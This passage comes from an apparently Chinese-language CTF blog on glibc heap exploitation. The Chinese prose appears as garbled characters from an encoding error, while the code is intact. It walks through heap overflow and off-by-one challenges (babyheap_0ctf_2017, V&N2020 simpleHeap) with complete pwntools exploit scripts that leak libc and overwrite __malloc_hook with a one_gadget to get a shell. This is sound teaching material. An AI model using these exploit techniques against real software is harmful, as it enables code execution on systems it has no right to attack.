upï¼‰"></a>tcache key - å †åŸºå€ï¼ˆonly libc2.29 and upï¼‰</h4><p>tcache keyæ‰€ç”¨çš„å€¼ä¾¿æ˜¯tcacheç»“æ„ä½“æœ¬èº«çš„åœ°å€ï¼Œæ•…è‹¥æˆ‘ä»¬èƒ½å¤Ÿæ‰“å°tcache keyï¼Œå°±èƒ½ç›´æ¥è·å¾—å †åŸºå€</p><p>æœ‰å¦‚ä¸‹æ¿å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = heap_leak - <span class="number">0x290</span> - <span class="number">0x10</span> <span class="comment"># C</span></span><br><span class="line">heap_base = heap_leak - <span class="number">0x11c10</span> - <span class="number">0x290</span> - <span class="number">0x10</span> <span class="comment"># C++ with string cin cout</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ä¸åŒç‰ˆæœ¬çš„libcä¸‹è¿™ä¸ªåç§»ï¼ˆ0x290ï¼Œlibc2.31 coverï¼‰å¹¶ä¸ä¸€å®šæ˜¯ç›¸åŒçš„ï¼Œè¿˜éœ€è¦è¯»è€…è‡ªè¡Œä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•</p><h3 id="äºŒã€å †æº¢å‡º"><a href="#äºŒã€å †æº¢å‡º" class="headerlink" title="äºŒã€å †æº¢å‡º"></a>äºŒã€å †æº¢å‡º</h3><p>å †æº¢å‡ºé€šå¸¸æŒ‡çš„æ˜¯åœ¨ç¨‹åºè¯»å–è¾“å…¥åˆ°å †å—ä¸Šæ—¶ï¼Œæœªç»ä¸¥æ ¼çš„æ£€æµ‹ï¼ˆå¦‚ä½¿ç”¨<code>gets()</code>è¯»å…¥ï¼‰ï¼Œå¯¼è‡´ç”¨æˆ·è¾“å…¥çš„æ•°æ®å¯ä»¥æº¢å‡ºåˆ°å…¶ç‰©ç†ç›¸é‚»é«˜åœ°å€çš„chunkï¼Œä»è€Œæ”¹å†™å…¶ç»“æ„ï¼Œäºˆæ”»å‡»è€…ä»¥æ— é™çš„åˆ©ç”¨ç©ºé—´</p><h5 id="ä¾‹é¢˜ï¼šbabyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><a href="#ä¾‹é¢˜ï¼šbabyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget" class="headerlink" title="ä¾‹é¢˜ï¼šbabyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget"></a>ä¾‹é¢˜ï¼šbabyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget</h5><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°<strong>ä¿  æŠ¤  å…¨  å¼€</strong>ï¼ˆ<strong>å¿ƒ è‚º åœ æ­¢</strong></p><p><img src="https://i.loli.net/2020/09/21/aZJExgI4UqDuPoj.png" alt="image.png"></p><p>æ‹–å…¥IDAé‡Œè¿›è¡Œåˆ†æï¼ˆä»¥ä¸‹éƒ¨åˆ†å‡½æ•°ã€å˜é‡åç»è¿‡é‡å‘½åï¼‰</p><p>å¸¸è§çš„å †é¢˜åŸºæœ¬ä¸Šéƒ½æ˜¯èœå•é¢˜ï¼Œæœ¬é¢˜ä¹Ÿä¸ä¾‹å¤–<img src="https://i.loli.net/2020/09/30/VEjFKYhibtqHfs6.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨<code>writeHeap()</code>å‡½æ•°ä¸­å¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„é•¿åº¦è¿›è¡Œæ£€æŸ¥ï¼Œ<strong>å­˜åœ¨å †æº¢å‡º</strong></p><p><img src="https://i.loli.net/2020/09/30/WAOCpdZMVRlSxgm.png" alt="image.png"></p><p>æ•…æˆ‘ä»¬è€ƒè™‘å…ˆåˆ›å»ºå‡ ä¸ªå°å †å—ï¼Œå†åˆ›å»ºä¸€ä¸ªå¤§å †å—ï¼Œfreeæ‰ä¸¤ä¸ªå°å †å—è¿›å…¥åˆ°fastbinï¼Œç”¨å †æº¢å‡ºæ”¹å†™fastbinç¬¬ä¸€ä¸ªå—çš„fdæŒ‡é’ˆä¸ºæˆ‘ä»¬æ‰€ç”³è¯·çš„å¤§å †å—çš„åœ°å€ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯fastbinä¼šå¯¹chunkçš„sizeè¿›è¡Œæ£€æŸ¥ï¼Œæ•…æˆ‘ä»¬è¿˜éœ€è¦å…ˆé€šè¿‡å †æº¢å‡ºæ”¹å†™å¤§å †å—çš„sizeï¼Œä¹‹åå°†å¤§å †å—åˆ†é…å›æ¥åæˆ‘ä»¬å°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå †å—</p><p><img src="https://i.loli.net/2020/10/07/XARM5QmBzFadtWi.png" alt="62DB8B2E56B87418664EEB947A980782.png"></p><p>åˆ©ç”¨å †æº¢å‡ºå°†å¤§å †å—çš„sizeé‡æ–°æ”¹å¤§å†freeä»¥é€å…¥unsorted binï¼Œæ­¤æ—¶å¤§å †å—çš„fdä¸bkæŒ‡é’ˆæŒ‡å‘main_arena+0x58çš„ä½ç½®ï¼Œåˆ©ç”¨å¦å¤–ä¸€ä¸ªæŒ‡å‘è¯¥å¤§å †å—çš„æŒ‡é’ˆè¾“å‡ºfdçš„å†…å®¹å³å¯å¾—åˆ°main_arena+0x58çš„åœ°å€ï¼Œå°±å¯ä»¥ç®—å‡ºlibcçš„åŸºå€</p><p><img src="https://i.loli.net/2020/10/07/IBAZ6ChTOrQwonp.png" alt="72934A2F942430E796048F09C96A261F.png"></p><p>æ¥ä¸‹æ¥ä¾¿æ˜¯fastbin attackï¼šå°†æŸä¸ªå †å—é€å…¥fastbinåæ”¹å†™å…¶fdæŒ‡é’ˆä¸º__malloc_hookçš„åœ°å€ï¼ˆ__malloc_hookä½äºmain_arenaä¸Šæ–¹0x10å­—èŠ‚å¤„ï¼‰ï¼Œå†å°†è¯¥å †å—åˆ†é…å›æ¥ï¼Œæ­¤æ—¶fastbinä¸­è¯¥é“¾è¡¨ä¸Šå°±ä¼šå­˜åœ¨ä¸€ä¸ªæˆ‘ä»¬æ‰€ä¼ªé€ çš„ä½äº__malloc_hookä¸Šçš„å †å—ï¼Œç”³è¯·è¿™ä¸ªå †å—åæˆ‘ä»¬ä¾¿å¯ä»¥æ”¹å†™malloc_hookä¸Šçš„å†…å®¹ä¸ºåé—¨å‡½æ•°åœ°å€ï¼Œæœ€åéšä¾¿åˆ†é…ä¸€ä¸ªå †å—ä¾¿å¯getshell</p><p>è€ƒè™‘åˆ°é¢˜ç›®ä¸­å¹¶ä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„åé—¨å‡½æ•°ï¼Œæ•…è€ƒè™‘ä½¿ç”¨one_gadgetä»¥getshell</p><p><img src="https://i.loli.net/2020/10/07/glLRkSdY3GufeOv.png" alt="D2D612904D8AB28F1DCCE651D4B81508.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯fastbinå­˜åœ¨sizeæ£€æŸ¥ï¼Œæ•…åœ¨è¿™é‡Œæˆ‘ä»¬é€‰æ‹©åœ¨__malloc_hook - 0x23çš„ä½ç½®æ„é€ fake chunkï¼ˆsizeå­—æ®µä¸º0x7fåˆšå¥½èƒ½å¤Ÿé€šè¿‡malloc(0x60)çš„sizeæ£€æŸ¥ï¼‰</p><p>æ„é€ payloadå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27143</span>)<span class="comment">#process(&#x27;./babyheap_0ctf_2017&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index:<span class="built_in">int</span>,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line">    </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#idx1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1, the former idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2, the former idx4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx5, prevent the top chunk combine it</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into unsorted bin, fd points to the main_arena</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into fastbin</span></span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload) <span class="comment">#overwrite fd to fake chunk addr</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx6, our fake chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å³å¯get shell</p><p><img src="https://i.loli.net/2020/10/07/9n7EyWL5OC3aIcm.png" alt="image.png"></p><h4 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h4><p>off by oneé€šå¸¸æŒ‡çš„æ˜¯å¯¹äºå †å—çš„è¯»å†™å­˜åœ¨ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºï¼Œåˆ©ç”¨è¿™ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºæˆ‘ä»¬å¯ä»¥æº¢å‡ºåˆ°ä¸€ä¸ªchunkç‰©ç†ç›¸é‚»é«˜åœ°å€chunkçš„sizeä½ï¼Œç¯¡æ”¹å…¶sizeä»¥ä¾¿åç»­çš„åˆ©ç”¨</p><h5 id="ä¾‹é¢˜ï¼š-V-amp-N2020-å…¬å¼€èµ›-simpleHeap-off-by-one-fastbin-attack-one-gadget"><a href="#ä¾‹é¢˜ï¼š-V-amp-N2020-å…¬å¼€èµ›-simpleHeap-off-by-one-fastbin-attack-one-gadget" class="headerlink" title="ä¾‹é¢˜ï¼š[V&amp;N2020 å…¬å¼€èµ›]simpleHeap - off by one + fastbin attack + one_gadget"></a>ä¾‹é¢˜ï¼š[V&amp;N2020 å…¬å¼€èµ›]simpleHeap - off by one + fastbin attack + one_gadget</h5><p>åˆæ˜¯ä¸€é“å †é¢˜æ¥äº†ï¼Œä¸å‡ºæ‰€æ–™ï¼Œä¿  æŠ¤  å…¨  å¼€</p><p><img src="https://i.loli.net/2020/12/01/iyIftbNOM4CrTka.png" alt="image.png"></p><p>åŒæ—¶é¢˜ç›®æç¤ºUbuntu16ï¼Œä¹Ÿå°±æ˜¯è¯´æ²¡æœ‰tcache</p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/01/IWHrRozGqyLDfUX.png" alt="image.png"></p><p>è¿™æ˜¯ä¸€é“æœ‰ç€åˆ†é…ã€æ‰“å°ã€é‡Šæ”¾ã€ç¼–è¾‘å †å—çš„åŠŸèƒ½çš„å †é¢˜ï¼Œä¸éš¾çœ‹å‡ºæˆ‘ä»¬åªèƒ½åˆ†é…10ä¸ªå †å—ï¼Œä¸è¿‡æ²¡æœ‰tcacheçš„æƒ…å†µä¸‹ï¼Œç©ºé—´å…¶å®è¿˜æ˜¯æŒºå……è¶³çš„                                                                                                                   </p><p>æ¼æ´ç‚¹åœ¨editå‡½æ•°ä¸­ï¼Œ<strong>ä¼šå¤šè¯»å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œå­˜åœ¨off by oneæ¼æ´</strong>ï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´æˆ‘ä»¬å¯ä»¥<strong>ä¿®æ”¹ä¸€ä¸ªå †å—çš„ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªå †å—çš„size</strong></p><p><img src="https://i.loli.net/2020/12/01/o9PlK4ECbHuFiN6.png" alt="image.png"></p><p>ç”±äºé¢˜ç›®æœ¬èº«ä»…å…è®¸åˆ†é…å¤§å°å°äº111çš„chunkï¼Œè€Œè¿›å…¥unsorted binéœ€è¦malloc(0x80)çš„chunkï¼Œæ•…æˆ‘ä»¬è¿˜æ˜¯è€ƒè™‘åˆ©ç”¨off by oneçš„æ¼æ´æ”¹å¤§ä¸€ä¸ªchunkçš„sizeé€å…¥unsorted binååˆ†å‰²é€ æˆoverlappingçš„æ–¹å¼è·å¾—libcçš„åœ°å€</p><p><img src="https://i.loli.net/2020/12/03/mh1HLy7cvGrCUAQ.png" alt="image.png"></p><p>å› ä¸ºåˆšå¥½fastbin attackæ‰€ç”¨çš„chunkçš„sizeä¸º0x71ï¼Œæ•…æˆ‘ä»¬å°†è¿™ä¸ªå¤§chunkçš„sizeæ”¹ä¸º<code> 0x70 + 0x70 + 1 = 0xe1</code>å³å¯</p><p>ä¼ ç»Ÿæ€è·¯æ˜¯å°†__malloc_hookæ”¹ä¸ºone_gadgetä»¥getshellï¼Œä½†æ˜¯ç›´æ¥å°è¯•æˆ‘ä»¬ä¼šå‘ç°æ ¹æœ¬æ— æ³•getshell</p><p><img src="https://i.loli.net/2020/12/03/RXyTELuGiqKCSh7.png" alt="image.png"></p><p>è¿™æ˜¯å› ä¸ºone_gadgetå¹¶éä»»ä½•æ—¶å€™éƒ½æ˜¯é€šç”¨çš„ï¼Œéƒ½æœ‰ä¸€å®šçš„å…ˆå†³æ¡ä»¶ï¼Œè€Œå½“å‰çš„ç¯å¢ƒåˆšå¥½ä¸æ»¡è¶³one_gadgetçš„ç¯å¢ƒ</p><p><img src="https://i.loli.net/2020/12/03/DlinxIM76eTLu8S.png" alt="image.png"></p><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨reallocå‡½æ•°ä¸­çš„gadgetæ¥è¿›è¡Œå‹æ ˆç­‰æ“ä½œæ¥æ»¡è¶³one_gadgetçš„è¦æ±‚ï¼Œè¯¥æ®µgadgetæ‰§è¡Œå®Œæ¯•åä¼šè·³è½¬è‡³__realloc_hookï¼ˆè‹¥ä¸ä¸ºNULLï¼‰</p><p><img src="https://i.loli.net/2020/12/03/PNyq3WFTU8mtYSM.png" alt="image.png"></p><p>è€Œ__realloc_hookå’Œ__malloc_hookåˆšå¥½æ˜¯æŒ¨ç€çš„ï¼Œæˆ‘ä»¬åœ¨fastbin attackæ—¶å¯ä»¥ä¸€å¹¶ä¿®æ”¹</p><p><img src="https://i.loli.net/2020/12/03/AG3oW65aVeCzMgt.png" alt="image.png"></p><p>æ•…è€ƒè™‘ä¿®æ”¹__malloc_hookè·³è½¬è‡³reallocå‡½æ•°å¼€å¤´çš„gadgetè°ƒæ•´å †æ ˆï¼Œä¿®æ”¹__realloc_hookä¸ºone_gadgetå³å¯getshell</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28978</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># initialize chunk</span></span><br><span class="line">    new(<span class="number">0x18</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 3, prevent the top chunk consolidation</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># off by one get the unsorted bin chunk</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + <span class="string">b&#x27;\xe1&#x27;</span>) <span class="comment"># 0x70 + 0x70 + 1</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc addr</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line">    log.success(<span class="string">&quot;libc addr: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overlapping and fastbin double free</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 4, overlapping with idx 2</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake chunk overwrite __realloc_hook</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + one_gadget) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + <span class="number">0x10</span>)) <span class="comment"># idx 5, our fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯get shell</p><p><img src="https://i.loli.net/2020/12/03/5hSCU9J7GdHwvWK.png" alt="image.png"></p><h4 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h4><p>off by nullåˆ™æ˜¯off by oneçš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œå³ä»…æº¢å‡ºä¸€ä¸ª<code>&#39;\0&#39;</code>å­—èŠ‚ï¼Œé€šå¸¸å‡ºç°äºè¯»å…¥å­—ç¬¦ä¸²æ—¶è®¾è®¡é€»è¾‘å¤±è¯¯çš„æƒ…å†µ</p><p>æ¯”èµ·off by oneï¼Œè¯¥ç§æ¼æ´é™åˆ¶äº†æº¢å‡ºçš„ä¸€ä¸ªå­—èŠ‚ä¸º<code>&#39;\0&#39;</code>ï¼Œæå¤§åœ°é™åˆ¶äº†æˆ‘ä»¬çš„åˆ©ç”¨</p><h5 id="ä¾‹é¢˜ï¼šLCTF2018-easy-heap-off-by-null-chunk-overlapping-Unsorted-bin-Leak-one-gadget"><a href="#ä¾‹é¢˜ï¼šLCTF2018-easy-heap-off-by-null-chunk-overlapping-Unsorted-bin-Leak-one-gadget" class="headerlink" title="ä¾‹é¢˜ï¼šLCTF2018 - easy_heap - off by null + chunk overlapping + Unsorted bin Leak + one_gadget"></a>ä¾‹é¢˜ï¼šLCTF2018 - easy_heap - off by null + chunk overlapping + Unsorted bin Leak + one_gadget</h5><p><a href="/download/lctf2018/easy_heap">ç‚¹å‡»ä¸‹è½½-easy_heap</a></p><p><a href="/download/lctf2018/libc64.so">ç‚¹å‡»ä¸‹è½½-libc64.so</a></p><p>æƒ¯ä¾‹çš„<code>checksec</code>åˆ†æï¼Œä¿æŠ¤å…¨å¼€</p><p><img src="https://i.loli.net/2020/11/16/W2j7nlNHPq5rM9x.png" 